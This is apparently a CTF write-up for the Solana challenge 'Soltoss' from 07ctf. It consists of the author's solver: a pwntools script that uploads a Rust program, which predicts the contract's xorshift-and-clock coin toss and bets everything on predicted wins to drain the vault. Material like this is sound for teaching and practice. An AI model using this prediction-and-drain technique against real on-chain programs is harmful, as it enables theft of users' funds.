---
title: "Soltoss - 07ctf"
category: "blockchain"
subcategory: "prng"
type: "writeup"
tags: ["minaminao-my-ctf-challenges", "author-solution", "challenge-source", "xorshift", "base58", "os-system", "blockchain", "07ctf"]
summary: "Challenge Soltoss with the author's own solution."
source:
  name: "minaminao/my-ctf-challenges"
  url: "https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/07ctf/soltoss"
license: "none stated"
ctf:
  name: "07ctf"
  challenge: "Soltoss"
---

## Challenge

- **Author:** [minaminao](https://github.com/minaminao)
- **Source:** <https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/07ctf/soltoss>
- **CTF:** 07ctf

---

# soltoss

**Challenge Name**:  
soltoss

**Description**:  
```
What's your favorite thing to toss in your ramen?

{{ nc }}

NOTE: Make sure it can be solved locally before running it remotely.
```

## Run

```
export DOCKER_DEFAULT_PLATFORM=linux/amd64 # if macOS
docker compose --build
```

## Build & Run

```
export DOCKER_DEFAULT_PLATFORM=linux/amd64 # if macOS
docker compose -f compose.develop.yaml up --build
```

## Format

```
make fmt
```

## Generate Distfiles

```
make generate-distfiles
```


## Solver: `solve.py`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/07ctf/soltoss/solve/solve.py>

```python
import os

import base58
from pwn import args, remote
from solders.pubkey import Pubkey as PublicKey

os.system("cargo build-sbf")

host = args.HOST or "localhost"
port = args.PORT or 5001

r = remote(host, port, level="debug")
solve = open("target/deploy/soltoss_solve.so", "rb").read()

r.recvuntil(b"program pubkey: ")
r.sendline(b"5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwZexx")
r.recvuntil(b"program len: ")
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b"challenge program address: ")
program = PublicKey(base58.b58decode(r.recvline().strip().decode()))
r.recvuntil(b"player address: ")
player = PublicKey(base58.b58decode(r.recvline().strip().decode()))

r.recvuntil(b"vault PDA address: ")
vault = PublicKey(base58.b58decode(r.recvline().strip().decode()))

calculated_vault, vault_bump = PublicKey.find_program_address([b"vault"], program)

print("CHALLENGE PROGRAM:", program)
print("PLAYER:", player)
print("VAULT PDA (from server):", vault)
print("VAULT PDA (calculated):", calculated_vault)
print("VAULT BUMP:", vault_bump)

assert vault == calculated_vault, (
    f"Vault mismatch: server={vault}, calculated={calculated_vault}"
)

for i in range(10):
    r.sendline(b"5")  # Number of accounts
    r.sendline(b"x " + str(program).encode())  # Challenge program (executable)
    r.sendline(b"ws " + str(player).encode())  # Player (writable, signer)
    r.sendline(
        b"r SysvarC1ock11111111111111111111111111111111"
    )  # Clock sysvar (readonly)
    r.sendline(b"w " + str(vault).encode())  # Vault PDA (writable)
    r.sendline(b"r 11111111111111111111111111111111")  # System program (readonly)
    r.recvuntil(b"ix len:")
    r.sendline(b"1")
    r.send(str(i).encode())

leak = r.recvall()
print(leak.decode())
```


## Solver: `lib.rs`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/07ctf/soltoss/solve/src/lib.rs>

```rust
use solana_program::entrypoint;

pub mod processor;
use processor::process_instruction;
entrypoint!(process_instruction);
```


## Solver: `processor.rs`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/07ctf/soltoss/solve/src/processor.rs>

```rust
use borsh::BorshDeserialize;
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    pubkey::Pubkey,
    sysvar::{clock::Clock, Sysvar},
};

use soltoss::find_vault_pda;

#[derive(BorshDeserialize)]
pub struct VaultState {
    pub balance: u64,
    pub bump: u8,
    pub rand: u64,
}

fn xorshift(mut x: u64) -> u64 {
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    x *= 0x2545F4914F6CDD1D;
    return x;
}

pub fn process_instruction(
    _program: &Pubkey,
    accounts: &[AccountInfo],
    _data: &[u8],
) -> ProgramResult {
    let account_iter = &mut accounts.iter();
    let challenge_program = next_account_info(account_iter)?;
    let player = next_account_info(account_iter)?;
    let clock_account = next_account_info(account_iter)?;
    let vault_account = next_account_info(account_iter)?;
    let system_program = next_account_info(account_iter)?;

    let (vault_pda, _bump) = find_vault_pda(challenge_program.key);

    let current_balance = player.lamports();
    let target_balance = 1_000_000_000_000u64; // 1000 SOL
    if current_balance >= target_balance {
        return Ok(());
    }

    let vault_state = VaultState::deserialize(&mut &vault_account.data.borrow()[..])?;
    let mut vault_rand = vault_state.rand;
    let clock = Clock::from_account_info(clock_account)?;

    for _round in 0..12 {
        let current_balance = player.lamports();
        let vault_balance = vault_account.lamports();

        if current_balance >= target_balance {
            msg!(
                "Target reached! Final balance: {} lamports ({:.9} SOL)",
                current_balance,
                current_balance as f64 / 1_000_000_000.0
            );
            break;
        }

        let timestamp = clock.unix_timestamp as u64;

        let predicted_rand = vault_rand.wrapping_add(timestamp);
        let predicted_rand = xorshift(predicted_rand);
        let predicted_is_heads = predicted_rand % 10 == 0;

        let desired_bet = if predicted_is_heads {
            current_balance
        } else {
            1u64 // Do not bet when we predict TAILS
        };

        vault_rand = predicted_rand;

        let bet_amount = if vault_balance >= desired_bet {
            desired_bet
        } else {
            if vault_balance < desired_bet {
                vault_balance
            } else {
                desired_bet
            }
        };

        if bet_amount == 0 {
            msg!("Cannot place any bet due to insufficient vault balance");
            break;
        }

        let coin_toss_ix =
            soltoss::coin_toss(*challenge_program.key, *player.key, vault_pda, bet_amount);

        invoke(
            &coin_toss_ix,
            &[
                clock_account.clone(),
                player.clone(),
                vault_account.clone(),
                system_program.clone(),
            ],
        )?;
    }

    Ok(())
}
```
